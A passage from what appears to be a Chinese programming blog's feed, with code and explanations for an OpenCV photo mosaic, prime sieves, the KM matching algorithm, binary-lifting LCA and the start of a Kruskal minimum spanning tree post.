* <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>,</span><br><span class="line">                          flush=<span class="literal">True</span>)</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'this path not exist'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">'\n--- handlePictures end ---'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleVideoMaterial</span><span class="params">(needNum)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial2 begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    <span class="comment"># 视频总帧数</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># 提取帧数的步长</span></span><br><span class="line">    step = frameNum // needNum</span><br><span class="line">    cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        ret, frame = cap.read()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">                aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                averHex = BGR2HEX(aver)</span><br><span class="line">                cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">                imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished!  way 2 cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img = cv2.imread(BACKGROUND_URL)</span><br><span class="line">    way = int(input(<span class="string">'请选择你的方式：1.从视频中截取 2.从含有图片的文件夹中提取'</span>))</span><br><span class="line">    <span class="keyword">if</span> way == <span class="number">1</span>:</span><br><span class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handleVideoMaterial(needNum=<span class="number">3000</span>)</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br><span class="line">    <span class="keyword">elif</span> way == <span class="number">2</span>:</span><br><span class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handlePictures()</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>OpenCV</tag>
        <tag>图像</tag>
      </tags>
  </entry>
  <entry>
    <title>几种求质数的方法</title>
    <url>/2020/10/03/%E5%87%A0%E7%A7%8D%E6%B1%82%E8%B4%A8%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h2><p>也称定义法</p>
<blockquote>
<p>质数是指在大于1的自然数中，除了1和它本身以外不再有其他因数的自然数。</p>
</blockquote>
<p>对于给定数字<code>n</code>，直接枚举<code>j</code>从1到<code>n-1</code>，如果<code>j</code>能够整除<code>n</code>，说明<code>n</code>不是质数<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_simple</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= num - <span class="number">1</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于只是判断一个数字的时候，时间复杂度是<code>O(n)</code>，但是当我们需要判断某个区间的质数的时候，时间复杂度就上升到了<code>O(n^2)</code>。</p>
<h2 id="简单优化"><a href="#简单优化" class="headerlink" title="简单优化"></a>简单优化</h2><p>实际上枚举<code>j</code>到根号<code>n</code>就可以了，因为对于非质数<code>num</code>，存在<code>a*b==num</code>，若<code>a</code>和<code>b</code>均不为1，则<code>a</code>和<code>b</code>中必有且仅有一个大于等于根号<code>num</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_advanced</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i * i &lt;= num;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于只是判断一个数字的时候，时间复杂度是<code>√n</code>，但是当我们需要判断某个区间的质数的时候，时间复杂度就上升到了<code>O(n√n)</code>。</p>
<h2 id="埃拉托斯特尼筛法"><a href="#埃拉托斯特尼筛法" class="headerlink" title="埃拉托斯特尼筛法"></a>埃拉托斯特尼筛法</h2><p>对于频繁求区间质数个数、区间跨度较大的情况，上面的方法效率很低，因为每次计算一个数字，都要从2进行枚举；我们换个思路想想，能够被质数整除的数字一定是合数（非质数），那我们直接将求得的质数，然后乘以相应的数字，得到的就一定是合数，将这些合数删去，不就只剩下了质数了吗？</p>
<p>筛选法的总体思路就是：首先假设序列<code>num=2、3、4、5、……、n</code>都是质数</p>
<ul>
<li>2作为<code>num</code>的第一个质数，将2的倍数<code>4,6,8,……,</code>标记为合数</li>
<li>3作为<code>num</code>的第二个质数，将3的倍数<code>6,9,12,……</code>标记为合数</li>
<li>5作为<code>num</code>的第三个质数，将5的倍数<code>10,15,20,……</code>标记为合数</li>
</ul>
<p>每次取序列中的一个数字<code>a</code>作为筛选的依据，在这里的<code>a</code>同样枚举到不超过<code>√n</code>即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">bool</span> isPrime[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_super</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isPrime, <span class="literal">true</span>, <span class="keyword">sizeof</span>(isPrime));</span><br><span class="line">    isPrime[<span class="number">1</span>] = <span class="literal">false</span>, isPrime[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPrime[i]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; MAXN; j += i) &#123;</span><br><span class="line">            isPrime[j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的时间复杂度我不太懂计算，但是至少比简单优化方法高效。</p>
<h2 id="线性筛法–欧拉筛法"><a href="#线性筛法–欧拉筛法" class="headerlink" title="线性筛法–欧拉筛法"></a>线性筛法–欧拉筛法</h2><p>但是我们也会发现，有些数字被删除了好几次，比如说12，第一次被2删除，第二次被3删除；120分别被2、3、5删除，……，这样子我们的程序还是不够快，有没有办法能够确定每一个合数都只被删除一次呢？答案是有的，可以证明一个合数<code>num</code>的最小非1的因子一定是一个不大于<code>√n</code>的质数，利用这个性质，利用质数进行筛选的时候可以提前进行结束删除：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 存放质数，可以不需要该数组，通过 isDeleted[] 也可以判断是否为质数，只不过使用</span></span><br><span class="line"><span class="comment">// prime[] 的速度可以更加快</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">int</span> prime[MAXN];</span><br><span class="line"><span class="keyword">bool</span> isDeleted[MAXN];</span><br><span class="line"><span class="keyword">int</span> lastPrimeIndex = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_extreme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isDeleted, <span class="literal">false</span>, <span class="keyword">sizeof</span>(isDeleted));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isDeleted[i]) prime[lastPrimeIndex++] = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lastPrimeIndex &amp;&amp; i * prime[j] &lt; MAXN; j++) &#123;</span><br><span class="line">            isDeleted[i * prime[j]] = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// 提前结束删除过程</span></span><br><span class="line">            <span class="keyword">if</span> (i % prime[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>质数</tag>
        <tag>筛选法</tag>
      </tags>
  </entry>
  <entry>
    <title>利用KM算法求解最大权匹配</title>
    <url>/2020/11/27/%E5%88%A9%E7%94%A8KM%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E6%9C%80%E5%A4%A7%E6%9D%83%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>KM</code>算法是一种计算机算法，功能是求完备匹配下的最大权<a href="https://baike.baidu.com/item/匹配/6397551" target="_blank" rel="noopener">匹配</a>。在一个二分图内，左顶点为<code>X</code>，右顶点为<code>Y</code>，现对于每组左右连接<code>Xi-&gt;Yj</code>有权<code>wij</code>，求一种匹配使得所有<code>wij</code>的和最大<a id="more"></a></p>
<p>参考博客：<a href="https://www.cnblogs.com/logosG/p/logos.html" target="_blank" rel="noopener">KM算法入门</a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2255" target="_blank" rel="noopener">奔小康挣大钱</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">305</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> love[MAXN][MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_user[MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_house[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_user[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_house[MAXN];</span><br><span class="line"><span class="keyword">int</span> match[MAXN];</span><br><span class="line"><span class="keyword">int</span> slack[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> user)</span> </span>&#123;</span><br><span class="line">    vis_user[user] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> house = <span class="number">0</span>; house &lt; N; ++house) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vis_house[house]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> gap = ex_user[user] + ex_house[house] - love[user][house];</span><br><span class="line">        <span class="keyword">if</span> (gap == <span class="number">0</span>) &#123;</span><br><span class="line">            vis_house[house] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (match[house] == <span class="number">-1</span> || dfs(match[house])) &#123;</span><br><span class="line">                match[house] = user;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            slack[house] = <span class="built_in">min</span>(slack[house], gap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(match, <span class="number">-1</span>, <span class="keyword">sizeof</span> match);</span><br><span class="line">    <span class="built_in">memset</span>(ex_house, <span class="number">0</span>, <span class="keyword">sizeof</span> ex_house);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        ex_user[i] = love[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; N; ++j) &#123;</span><br><span class="line">            ex_user[i] = <span class="built_in">max</span>(ex_user[i], love[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        <span class="built_in">fill</span>(slack, slack + N, INF);</span><br><span class="line">       <span class="comment">//如果为用户 i 匹配房子失败 则通过降低期望值进行尝试匹配</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(vis_user, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_user);</span><br><span class="line">            <span class="built_in">memset</span>(vis_house, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_house);</span><br><span class="line">            <span class="comment">// 如果为用户 i 匹配房子成功</span></span><br><span class="line">            <span class="keyword">if</span> (dfs(i)) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">int</span> d = INF;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j)</span><br><span class="line">                <span class="keyword">if</span> (!vis_house[j]) d = <span class="built_in">min</span>(d, slack[j]);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vis_user[j]) ex_user[j] -= d;</span><br><span class="line">                <span class="keyword">if</span> (vis_house[j])</span><br><span class="line">                    ex_house[j] += d;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    slack[j] -= d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) res += love[match[i]][i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;love[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, KM());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>匈牙利算法</tag>
        <tag>KM</tag>
      </tags>
  </entry>
  <entry>
    <title>利用倍增的思想实现LCA算法</title>
    <url>/2021/05/27/%E5%88%A9%E7%94%A8%E5%80%8D%E5%A2%9E%E7%9A%84%E6%80%9D%E6%83%B3%E5%AE%9E%E7%8E%B0LCA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>LCA</code>算法指的是最近公共祖先（<code>Lowest Common Ancestor</code>），这里的最近指的是给定的两个点中所有的公共祖先中，距离根节点最远的节点，而且这两点到最近公共祖先的距离只和也是这两点之间的最短路径。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>实现该算法一般是借助每个节点的深度信息进行求解，具体为：</p>
<p>假设要求<code>x</code>和<code>y</code>的<code>LCA</code> ，不妨假设<code>depth[x] &gt; depth[y]</code>，我们先让<code>x</code>往上跳（朝着根的方向），直到二者的深度相同，然后<code>x</code>和<code>y</code>同时网上跳，最终二者一定会在某一点相遇，这点就是所求。</p>
<p>这也叫朴素实现方法，当一棵树深度很大，查询点都是比较深的时候，此时在网上跳的过程会花费大量的时间，时间复杂度是<code>O(n)</code>。</p>
<p>而倍增思想解决的是，优化向上跳转的过程，每次尽可能地往上跳更多的距离。</p>
<p>相关代码说明请看代码注释：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 5e5 + 1, MAX_M = 5e5 + 1;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5e2</span> + <span class="number">1</span>, MAX_M = <span class="number">5e2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v, next;</span><br><span class="line">&#125;edges[MAX_M &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="comment">// head[] 节点i的第一条边，depth[] 节点的深度, f[][] 第i号节点的第2^j个祖先</span></span><br><span class="line"><span class="keyword">int</span> head[MAX_N], edgeNum = <span class="number">1</span>, depth[MAX_N], f[MAX_N][<span class="number">22</span>], n;</span><br><span class="line"><span class="comment">// 预处理 log2(i) 向下取整的值</span></span><br><span class="line"><span class="keyword">int</span> lg2[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preLg2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lg2[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; ++i) </span><br><span class="line">	  lg2[i] = lg2[i - <span class="number">1</span>] + (<span class="number">2</span> &lt;&lt; lg2[i - <span class="number">1</span>] == i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 采用链式前向星方式模拟链表</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    edges[edgeNum].v = v, edges[edgeNum].next = head[u];</span><br><span class="line">    head[u] = edgeNum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 快速读入，可理解为 scanf()</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt; <span class="string">'0'</span>  || ch &gt; <span class="string">'9'</span>)ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt;= <span class="string">'9'</span> &amp;&amp; ch &gt;= <span class="string">'0'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>)  + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nowId, <span class="keyword">int</span> fa)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 第 2 ^ 0 即第一个祖先（从 nowId 往根节点方向）</span></span><br><span class="line">    f[nowId][<span class="number">0</span>] = fa;</span><br><span class="line">    depth[nowId] = depth[fa] + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= lg2[depth[nowId]]; i++)</span><br><span class="line">        <span class="comment">// nowId 的第 2 ^ i 祖先是它的第 2 ^ (i - 1)个祖先的第 2 ^ (i - 1)个祖先</span></span><br><span class="line">        <span class="comment">// 要画图才能理解</span></span><br><span class="line">        f[nowId][i] = f[f[nowId][i - <span class="number">1</span>]][i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> eId = head[nowId]; eId; eId = edges[eId].next)</span><br><span class="line">        <span class="keyword">if</span> (edges[eId].v != fa)dfs(edges[eId].v, nowId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lca</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (depth[x] &lt; depth[y])swap(x, y);</span><br><span class="line">    <span class="comment">// 目的是将二者处理到同一个高度</span></span><br><span class="line">    <span class="keyword">while</span> (depth[x] &gt; depth[y])</span><br><span class="line">        <span class="comment">// 以高度差为依据进行跳</span></span><br><span class="line">        x = f[x][lg2[depth[x] - depth[y]]];</span><br><span class="line">    <span class="comment">// 二者相等，毫无疑问，此时 x 就是 y 的祖先</span></span><br><span class="line">    <span class="keyword">if</span>(x == y)<span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> <span class="built_in">step</span> = lg2[depth[x]];<span class="built_in">step</span> &gt;= <span class="number">0</span>; <span class="built_in">step</span>--)</span><br><span class="line">        <span class="keyword">if</span> (f[x][<span class="built_in">step</span>] != f[y][<span class="built_in">step</span>])</span><br><span class="line">            x = f[x][<span class="built_in">step</span>], y = f[y][<span class="built_in">step</span>];</span><br><span class="line">    <span class="keyword">return</span> f[x][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> m = <span class="built_in">read</span>(), s = <span class="built_in">read</span>(), u, v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        add(u, v), add(v, u);</span><br><span class="line">    &#125;</span><br><span class="line">    preLg2();</span><br><span class="line">    dfs(s, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, lca(u, v));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 5 4</span></span><br><span class="line"><span class="comment">3 1</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 1</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">3 2</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>题目参考：<a href="https://www.luogu.com.cn/problem/P3379" target="_blank" rel="noopener">洛谷P3397</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>倍增思想</tag>
      </tags>
  </entry>
  <entry>
    <title>利用并查集求最小生成树</title>
    <url>/2020/04/10/%E5%88%A9%E7%94%A8%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="什么是-Kruskal-算法？"><a href="#什么是-Kruskal-算法？" class="headerlink" title="什么是 Kruskal 算法？"></a>什么是 Kruskal 算法？</h2><p><strong>Kruskal</strong> 算法是求最小生成树的一种方法，有点类似于贪心算法，首先是按照边的权值从小到大进行排序，然后不断地将较小的边加入到过程解的集合，关键是要解决回路的问题，而利用并查集就可以很好地解决这个问题，即每次添加边之前，判断该边的两个顶点是否是处于相同的集合，相同就跳过，否则加入到过程解中，重复这个过程，知道最后只有一个集合，该集合即为所求。<a id="more"></a></p>
<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>来源于<a href="https://www.luogu.com.cn/problem/P3366" target="_blank" rel="noopener">洛谷</a></p>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题，给出一个无向图，求出最小生成树，如果该图不连通，则输出 <code>orz</code>。</p>
<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行包含两个整数 N,<em>M</em>，表示该图共有 <em>N</em> 个结点和 <em>M</em> 条无向边。</p>
<p>接下来 <em>M</em> 行每行包含三个整数 X<sub>i</sub>，  Y<sub>i</sub>，  Z<sub>i</sub>，表示有一条长度为   Z<sub>i</sub> 的无向边连接结点   X<sub>i</sub>，  Y<sub>i</sub></p>
<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>如果该图连通，则输出一个整数表示最小生成树的各边的长度之和。如果该图不连通则输出 <code>orz</code>。</p>
